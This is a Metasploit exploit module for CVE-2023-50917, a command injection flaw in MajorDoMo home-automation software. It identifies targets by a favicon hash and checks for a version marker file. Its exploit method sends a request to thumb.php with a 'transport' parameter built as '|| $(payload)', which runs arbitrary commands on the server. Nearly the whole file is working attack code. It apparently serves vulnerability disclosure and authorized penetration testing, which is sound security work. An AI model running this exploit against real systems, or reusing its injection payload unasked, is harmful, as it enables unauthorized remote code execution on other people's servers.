##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MajorDoMo Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in MajorDoMo
          versions before 0662e5e.
        },
        'Author' => ['Valentin Lobstein'], # Vulnerability discovery and Metasploit Module
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-50917'],
          ['URL', 'https://github.com/Chocapikk/CVE-2023-50917'],
          ['URL', 'https://chocapikk.com/posts/2023/cve-2023-50917'],
          ['URL', 'https://github.com/sergejey/majordomo'] # Vendor URL
        ],
        'DisclosureDate' => '2023-12-15',
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        },
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'Privileged' => false
      )
    )

    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'The URI path to MajorDoMo', '/']),
      OptString.new('USERNAME', [false, 'The HTTP Basic Authentication Username']),
      OptString.new('PASSWORD', [false, 'The HTTP Basic Authentication Password'])
    ])
  end

  def send_request_with_auth(uri, method: 'GET', vars_get: {}, vars_post: {})
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    unless user.to_s.empty? || pass.to_s.empty?
      credentials = Rex::Text.encode_base64("#{user}:#{pass}")
      auth_headers = { 'Authorization' => "Basic #{credentials}" }
    end

    send_request_cgi({
      'uri' => uri,
      'method' => method,
      'headers' => auth_headers,
      'vars_get' => vars_get,
      'vars_post' => vars_post
    })
  end

  def majordomo?
    favicon_uri = normalize_uri(datastore['TARGETURI'], '/favicon.ico')
    res = send_request_with_auth(favicon_uri)

    if res.nil? || res.code != 200
      print_error('Cannot verify if target is MajorDoMo')
      false
    elsif Rex::Text.md5(res.body) == '08d30f79c76f124754ac6f7789ca3ab1'
      print_good('Target is identified as MajorDoMo instance')
      true
    else
      print_error('Target might not be MajorDoMo')
      false
    end
  end

  def exploit
    send_request_with_auth(
      normalize_uri(datastore['TARGETURI'], 'modules', 'thumb', 'thumb.php'),
      method: 'GET',
      vars_get: {
        'url' => Rex::Text.encode_base64('rtsp://'),
        'debug' => '1',
        'transport' => "|| $(#{payload.encoded});"
      }
    )
  end

  def check
    return CheckCode::Unknown unless majordomo?

    uri = normalize_uri(datastore['TARGETURI'], '3rdparty', 'threejs', 'Detector.js')
    res = send_request_with_auth(uri)

    return CheckCode::Unknown if res.nil?

    res.code == 200 ? CheckCode::Safe : CheckCode::Vulnerable
  end
end
